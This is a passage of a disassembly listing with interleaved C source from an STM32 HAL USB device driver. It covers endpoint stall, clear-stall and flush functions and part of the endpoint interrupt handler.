 80023f6:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023fa:	2b01      	cmp	r3, #1
 80023fc:	d101      	bne.n	8002402 <HAL_PCD_EP_SetStall+0x7e>
 80023fe:	2302      	movs	r3, #2
 8002400:	e01c      	b.n	800243c <HAL_PCD_EP_SetStall+0xb8>
 8002402:	687b      	ldr	r3, [r7, #4]
 8002404:	2201      	movs	r2, #1
 8002406:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 800240a:	687b      	ldr	r3, [r7, #4]
 800240c:	681b      	ldr	r3, [r3, #0]
 800240e:	68f9      	ldr	r1, [r7, #12]
 8002410:	4618      	mov	r0, r3
 8002412:	f005 febb 	bl	800818c <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 8002416:	78fb      	ldrb	r3, [r7, #3]
 8002418:	f003 0307 	and.w	r3, r3, #7
 800241c:	2b00      	cmp	r3, #0
 800241e:	d108      	bne.n	8002432 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 8002420:	687b      	ldr	r3, [r7, #4]
 8002422:	681a      	ldr	r2, [r3, #0]
 8002424:	687b      	ldr	r3, [r7, #4]
 8002426:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800242a:	4619      	mov	r1, r3
 800242c:	4610      	mov	r0, r2
 800242e:	f005 fffc 	bl	800842a <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 8002432:	687b      	ldr	r3, [r7, #4]
 8002434:	2200      	movs	r2, #0
 8002436:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800243a:	2300      	movs	r3, #0
}
 800243c:	4618      	mov	r0, r3
 800243e:	3710      	adds	r7, #16
 8002440:	46bd      	mov	sp, r7
 8002442:	bd80      	pop	{r7, pc}

08002444 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002444:	b580      	push	{r7, lr}
 8002446:	b084      	sub	sp, #16
 8002448:	af00      	add	r7, sp, #0
 800244a:	6078      	str	r0, [r7, #4]
 800244c:	460b      	mov	r3, r1
 800244e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002450:	78fb      	ldrb	r3, [r7, #3]
 8002452:	f003 020f 	and.w	r2, r3, #15
 8002456:	687b      	ldr	r3, [r7, #4]
 8002458:	685b      	ldr	r3, [r3, #4]
 800245a:	429a      	cmp	r2, r3
 800245c:	d901      	bls.n	8002462 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 800245e:	2301      	movs	r3, #1
 8002460:	e040      	b.n	80024e4 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002462:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002466:	2b00      	cmp	r3, #0
 8002468:	da0e      	bge.n	8002488 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800246a:	78fb      	ldrb	r3, [r7, #3]
 800246c:	f003 0307 	and.w	r3, r3, #7
 8002470:	1c5a      	adds	r2, r3, #1
 8002472:	4613      	mov	r3, r2
 8002474:	009b      	lsls	r3, r3, #2
 8002476:	4413      	add	r3, r2
 8002478:	00db      	lsls	r3, r3, #3
 800247a:	687a      	ldr	r2, [r7, #4]
 800247c:	4413      	add	r3, r2
 800247e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002480:	68fb      	ldr	r3, [r7, #12]
 8002482:	2201      	movs	r2, #1
 8002484:	705a      	strb	r2, [r3, #1]
 8002486:	e00e      	b.n	80024a6 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002488:	78fb      	ldrb	r3, [r7, #3]
 800248a:	f003 0207 	and.w	r2, r3, #7
 800248e:	4613      	mov	r3, r2
 8002490:	009b      	lsls	r3, r3, #2
 8002492:	4413      	add	r3, r2
 8002494:	00db      	lsls	r3, r3, #3
 8002496:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800249a:	687a      	ldr	r2, [r7, #4]
 800249c:	4413      	add	r3, r2
 800249e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80024a0:	68fb      	ldr	r3, [r7, #12]
 80024a2:	2200      	movs	r2, #0
 80024a4:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 80024a6:	68fb      	ldr	r3, [r7, #12]
 80024a8:	2200      	movs	r2, #0
 80024aa:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80024ac:	78fb      	ldrb	r3, [r7, #3]
 80024ae:	f003 0307 	and.w	r3, r3, #7
 80024b2:	b2da      	uxtb	r2, r3
 80024b4:	68fb      	ldr	r3, [r7, #12]
 80024b6:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80024b8:	687b      	ldr	r3, [r7, #4]
 80024ba:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024be:	2b01      	cmp	r3, #1
 80024c0:	d101      	bne.n	80024c6 <HAL_PCD_EP_ClrStall+0x82>
 80024c2:	2302      	movs	r3, #2
 80024c4:	e00e      	b.n	80024e4 <HAL_PCD_EP_ClrStall+0xa0>
 80024c6:	687b      	ldr	r3, [r7, #4]
 80024c8:	2201      	movs	r2, #1
 80024ca:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 80024ce:	687b      	ldr	r3, [r7, #4]
 80024d0:	681b      	ldr	r3, [r3, #0]
 80024d2:	68f9      	ldr	r1, [r7, #12]
 80024d4:	4618      	mov	r0, r3
 80024d6:	f005 feaa 	bl	800822e <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 80024da:	687b      	ldr	r3, [r7, #4]
 80024dc:	2200      	movs	r2, #0
 80024de:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80024e2:	2300      	movs	r3, #0
}
 80024e4:	4618      	mov	r0, r3
 80024e6:	3710      	adds	r7, #16
 80024e8:	46bd      	mov	sp, r7
 80024ea:	bd80      	pop	{r7, pc}

080024ec <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024ec:	b580      	push	{r7, lr}
 80024ee:	b082      	sub	sp, #8
 80024f0:	af00      	add	r7, sp, #0
 80024f2:	6078      	str	r0, [r7, #4]
 80024f4:	460b      	mov	r3, r1
 80024f6:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80024f8:	687b      	ldr	r3, [r7, #4]
 80024fa:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024fe:	2b01      	cmp	r3, #1
 8002500:	d101      	bne.n	8002506 <HAL_PCD_EP_Flush+0x1a>
 8002502:	2302      	movs	r3, #2
 8002504:	e01b      	b.n	800253e <HAL_PCD_EP_Flush+0x52>
 8002506:	687b      	ldr	r3, [r7, #4]
 8002508:	2201      	movs	r2, #1
 800250a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800250e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002512:	2b00      	cmp	r3, #0
 8002514:	da09      	bge.n	800252a <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 8002516:	687b      	ldr	r3, [r7, #4]
 8002518:	681a      	ldr	r2, [r3, #0]
 800251a:	78fb      	ldrb	r3, [r7, #3]
 800251c:	f003 0307 	and.w	r3, r3, #7
 8002520:	4619      	mov	r1, r3
 8002522:	4610      	mov	r0, r2
 8002524:	f003 fcb8 	bl	8005e98 <USB_FlushTxFifo>
 8002528:	e004      	b.n	8002534 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 800252a:	687b      	ldr	r3, [r7, #4]
 800252c:	681b      	ldr	r3, [r3, #0]
 800252e:	4618      	mov	r0, r3
 8002530:	f003 fcbe 	bl	8005eb0 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002534:	687b      	ldr	r3, [r7, #4]
 8002536:	2200      	movs	r2, #0
 8002538:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800253c:	2300      	movs	r3, #0
}
 800253e:	4618      	mov	r0, r3
 8002540:	3708      	adds	r7, #8
 8002542:	46bd      	mov	sp, r7
 8002544:	bd80      	pop	{r7, pc}

08002546 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 8002546:	b580      	push	{r7, lr}
 8002548:	b096      	sub	sp, #88	; 0x58
 800254a:	af00      	add	r7, sp, #0
 800254c:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 800254e:	e3b1      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002550:	687b      	ldr	r3, [r7, #4]
 8002552:	681b      	ldr	r3, [r3, #0]
 8002554:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002558:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 800255c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002560:	b2db      	uxtb	r3, r3
 8002562:	f003 030f 	and.w	r3, r3, #15
 8002566:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 800256a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800256e:	2b00      	cmp	r3, #0
 8002570:	f040 8173 	bne.w	800285a <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002574:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002578:	f003 0310 	and.w	r3, r3, #16
 800257c:	2b00      	cmp	r3, #0
 800257e:	d150      	bne.n	8002622 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002580:	687b      	ldr	r3, [r7, #4]
 8002582:	681b      	ldr	r3, [r3, #0]
 8002584:	881b      	ldrh	r3, [r3, #0]
 8002586:	b29b      	uxth	r3, r3
 8002588:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 800258c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002590:	81fb      	strh	r3, [r7, #14]
 8002592:	687b      	ldr	r3, [r7, #4]
 8002594:	681a      	ldr	r2, [r3, #0]
 8002596:	89fb      	ldrh	r3, [r7, #14]
 8002598:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800259c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80025a0:	b29b      	uxth	r3, r3
 80025a2:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 80025a4:	687b      	ldr	r3, [r7, #4]
 80025a6:	3328      	adds	r3, #40	; 0x28
 80025a8:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 80025aa:	687b      	ldr	r3, [r7, #4]
 80025ac:	681b      	ldr	r3, [r3, #0]
 80025ae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80025b2:	b29b      	uxth	r3, r3
 80025b4:	461a      	mov	r2, r3
 80025b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b8:	781b      	ldrb	r3, [r3, #0]
 80025ba:	00db      	lsls	r3, r3, #3
 80025bc:	4413      	add	r3, r2
 80025be:	687a      	ldr	r2, [r7, #4]
 80025c0:	6812      	ldr	r2, [r2, #0]
 80025c2:	4413      	add	r3, r2
 80025c4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80025c8:	881b      	ldrh	r3, [r3, #0]
 80025ca:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80025ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d0:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 80025d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d4:	695a      	ldr	r2, [r3, #20]
 80025d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d8:	69db      	ldr	r3, [r3, #28]
 80025da:	441a      	add	r2, r3
 80025dc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025de:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80025e0:	2100      	movs	r1, #0
 80025e2:	6878      	ldr	r0, [r7, #4]
 80025e4:	f00a f98f 	bl	800c906 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80025e8:	687b      	ldr	r3, [r7, #4]
 80025ea:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025ee:	b2db      	uxtb	r3, r3
 80025f0:	2b00      	cmp	r3, #0
 80025f2:	f000 835f 	beq.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
 80025f6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025f8:	699b      	ldr	r3, [r3, #24]
 80025fa:	2b00      	cmp	r3, #0
 80025fc:	f040 835a 	bne.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 8002600:	687b      	ldr	r3, [r7, #4]
 8002602:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002606:	b2db      	uxtb	r3, r3
 8002608:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800260c:	b2da      	uxtb	r2, r3
 800260e:	687b      	ldr	r3, [r7, #4]
 8002610:	681b      	ldr	r3, [r3, #0]
 8002612:	b292      	uxth	r2, r2
 8002614:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002618:	687b      	ldr	r3, [r7, #4]
 800261a:	2200      	movs	r2, #0
 800261c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8002620:	e348      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 8002622:	687b      	ldr	r3, [r7, #4]
 8002624:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002628:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800262a:	687b      	ldr	r3, [r7, #4]
 800262c:	681b      	ldr	r3, [r3, #0]
 800262e:	881b      	ldrh	r3, [r3, #0]
 8002630:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002634:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002638:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800263c:	2b00      	cmp	r3, #0
 800263e:	d032      	beq.n	80026a6 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002640:	687b      	ldr	r3, [r7, #4]
 8002642:	681b      	ldr	r3, [r3, #0]
 8002644:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002648:	b29b      	uxth	r3, r3
 800264a:	461a      	mov	r2, r3
 800264c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800264e:	781b      	ldrb	r3, [r3, #0]
 8002650:	00db      	lsls	r3, r3, #3
 8002652:	4413      	add	r3, r2
 8002654:	687a      	ldr	r2, [r7, #4]
 8002656:	6812      	ldr	r2, [r2, #0]
 8002658:	4413      	add	r3, r2
 800265a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800265e:	881b      	ldrh	r3, [r3, #0]
 8002660:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002664:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002666:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002668:	687b      	ldr	r3, [r7, #4]
 800266a:	6818      	ldr	r0, [r3, #0]
 800266c:	687b      	ldr	r3, [r7, #4]
 800266e:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 8002672:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002674:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 8002676:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002678:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800267a:	b29b      	uxth	r3, r3
 800267c:	f005 ff23 	bl	80084c6 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002680:	687b      	ldr	r3, [r7, #4]
 8002682:	681b      	ldr	r3, [r3, #0]
 8002684:	881b      	ldrh	r3, [r3, #0]
 8002686:	b29a      	uxth	r2, r3
 8002688:	f640 738f 	movw	r3, #3983	; 0xf8f
 800268c:	4013      	ands	r3, r2
 800268e:	823b      	strh	r3, [r7, #16]
 8002690:	687b      	ldr	r3, [r7, #4]
 8002692:	681b      	ldr	r3, [r3, #0]
 8002694:	8a3a      	ldrh	r2, [r7, #16]
 8002696:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800269a:	b292      	uxth	r2, r2
 800269c:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 800269e:	6878      	ldr	r0, [r7, #4]
 80026a0:	f00a f904 	bl	800c8ac <HAL_PCD_SetupStageCallback>
 80026a4:	e306      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80026a6:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80026aa:	2b00      	cmp	r3, #0
 80026ac:	f280 8302 	bge.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80026b0:	687b      	ldr	r3, [r7, #4]
 80026b2:	681b      	ldr	r3, [r3, #0]
 80026b4:	881b      	ldrh	r3, [r3, #0]
 80026b6:	b29a      	uxth	r2, r3
 80026b8:	f640 738f 	movw	r3, #3983	; 0xf8f
 80026bc:	4013      	ands	r3, r2
 80026be:	83fb      	strh	r3, [r7, #30]
 80026c0:	687b      	ldr	r3, [r7, #4]
 80026c2:	681b      	ldr	r3, [r3, #0]
 80026c4:	8bfa      	ldrh	r2, [r7, #30]
 80026c6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80026ca:	b292      	uxth	r2, r2
 80026cc:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80026ce:	687b      	ldr	r3, [r7, #4]
 80026d0:	681b      	ldr	r3, [r3, #0]
 80026d2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026d6:	b29b      	uxth	r3, r3
 80026d8:	461a      	mov	r2, r3
 80026da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026dc:	781b      	ldrb	r3, [r3, #0]
 80026de:	00db      	lsls	r3, r3, #3
 80026e0:	4413      	add	r3, r2
 80026e2:	687a      	ldr	r2, [r7, #4]
 80026e4:	6812      	ldr	r2, [r2, #0]
 80026e6:	4413      	add	r3, r2
 80026e8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026ec:	881b      	ldrh	r3, [r3, #0]
 80026ee:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f4:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80026f6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f8:	69db      	ldr	r3, [r3, #28]
 80026fa:	2b00      	cmp	r3, #0
 80026fc:	d019      	beq.n	8002732 <PCD_EP_ISR_Handler+0x1ec>
 80026fe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002700:	695b      	ldr	r3, [r3, #20]
 8002702:	2b00      	cmp	r3, #0
 8002704:	d015      	beq.n	8002732 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002706:	687b      	ldr	r3, [r7, #4]
 8002708:	6818      	ldr	r0, [r3, #0]
 800270a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800270c:	6959      	ldr	r1, [r3, #20]
 800270e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002710:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 8002712:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002714:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002716:	b29b      	uxth	r3, r3
 8002718:	f005 fed5 	bl	80084c6 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 800271c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800271e:	695a      	ldr	r2, [r3, #20]
 8002720:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002722:	69db      	ldr	r3, [r3, #28]
 8002724:	441a      	add	r2, r3
 8002726:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002728:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 800272a:	2100      	movs	r1, #0
 800272c:	6878      	ldr	r0, [r7, #4]
 800272e:	f00a f8cf 	bl	800c8d0 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002732:	687b      	ldr	r3, [r7, #4]
 8002734:	681b      	ldr	r3, [r3, #0]
 8002736:	881b      	ldrh	r3, [r3, #0]
 8002738:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 800273c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002740:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002744:	2b00      	cmp	r3, #0
 8002746:	f040 82b5 	bne.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
 800274a:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800274e:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 8002752:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 8002756:	f000 82ad 	beq.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 800275a:	687b      	ldr	r3, [r7, #4]
 800275c:	681b      	ldr	r3, [r3, #0]
 800275e:	61bb      	str	r3, [r7, #24]
 8002760:	687b      	ldr	r3, [r7, #4]
 8002762:	681b      	ldr	r3, [r3, #0]
 8002764:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002768:	b29b      	uxth	r3, r3
 800276a:	461a      	mov	r2, r3
 800276c:	69bb      	ldr	r3, [r7, #24]
 800276e:	4413      	add	r3, r2
 8002770:	61bb      	str	r3, [r7, #24]
 8002772:	69bb      	ldr	r3, [r7, #24]
 8002774:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002778:	617b      	str	r3, [r7, #20]
 800277a:	697b      	ldr	r3, [r7, #20]
 800277c:	881b      	ldrh	r3, [r3, #0]
 800277e:	b29b      	uxth	r3, r3
 8002780:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002784:	b29a      	uxth	r2, r3
 8002786:	697b      	ldr	r3, [r7, #20]
 8002788:	801a      	strh	r2, [r3, #0]
 800278a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800278c:	691b      	ldr	r3, [r3, #16]
 800278e:	2b3e      	cmp	r3, #62	; 0x3e
 8002790:	d91d      	bls.n	80027ce <PCD_EP_ISR_Handler+0x288>
 8002792:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002794:	691b      	ldr	r3, [r3, #16]
 8002796:	095b      	lsrs	r3, r3, #5
 8002798:	647b      	str	r3, [r7, #68]	; 0x44
 800279a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800279c:	691b      	ldr	r3, [r3, #16]
 800279e:	f003 031f 	and.w	r3, r3, #31
 80027a2:	2b00      	cmp	r3, #0
 80027a4:	d102      	bne.n	80027ac <PCD_EP_ISR_Handler+0x266>
 80027a6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027a8:	3b01      	subs	r3, #1
 80027aa:	647b      	str	r3, [r7, #68]	; 0x44
 80027ac:	697b      	ldr	r3, [r7, #20]
 80027ae:	881b      	ldrh	r3, [r3, #0]
 80027b0:	b29a      	uxth	r2, r3
 80027b2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027b4:	b29b      	uxth	r3, r3
 80027b6:	029b      	lsls	r3, r3, #10
 80027b8:	b29b      	uxth	r3, r3
 80027ba:	4313      	orrs	r3, r2
 80027bc:	b29b      	uxth	r3, r3
 80027be:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027c2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027c6:	b29a      	uxth	r2, r3
 80027c8:	697b      	ldr	r3, [r7, #20]
 80027ca:	801a      	strh	r2, [r3, #0]
 80027cc:	e026      	b.n	800281c <PCD_EP_ISR_Handler+0x2d6>
 80027ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027d0:	691b      	ldr	r3, [r3, #16]
 80027d2:	2b00      	cmp	r3, #0
 80027d4:	d10a      	bne.n	80027ec <PCD_EP_ISR_Handler+0x2a6>
 80027d6:	697b      	ldr	r3, [r7, #20]
 80027d8:	881b      	ldrh	r3, [r3, #0]
 80027da:	b29b      	uxth	r3, r3
 80027dc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027e0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027e4:	b29a      	uxth	r2, r3
 80027e6:	697b      	ldr	r3, [r7, #20]
 80027e8:	801a      	strh	r2, [r3, #0]
 80027ea:	e017      	b.n	800281c <PCD_EP_ISR_Handler+0x2d6>
 80027ec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ee:	691b      	ldr	r3, [r3, #16]
 80027f0:	085b      	lsrs	r3, r3, #1
 80027f2:	647b      	str	r3, [r7, #68]	; 0x44
 80027f4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027f6:	691b      	ldr	r3, [r3, #16]
 80027f8:	f003 0301 	and.w	r3, r3, #1
 80027fc:	2b00      	cmp	r3, #0
 80027fe:	d002      	beq.n	8002806 <PCD_EP_ISR_Handler+0x2c0>
 8002800:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002802:	3301      	adds	r3, #1
 8002804:	647b      	str	r3, [r7, #68]	; 0x44
 8002806:	697b      	ldr	r3, [r7, #20]
 8002808:	881b      	ldrh	r3, [r3, #0]
 800280a:	b29a      	uxth	r2, r3
 800280c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800280e:	b29b      	uxth	r3, r3
 8002810:	029b      	lsls	r3, r3, #10
 8002812:	b29b      	uxth	r3, r3
 8002814:	4313      	orrs	r3, r2
 8002816:	b29a      	uxth	r2, r3
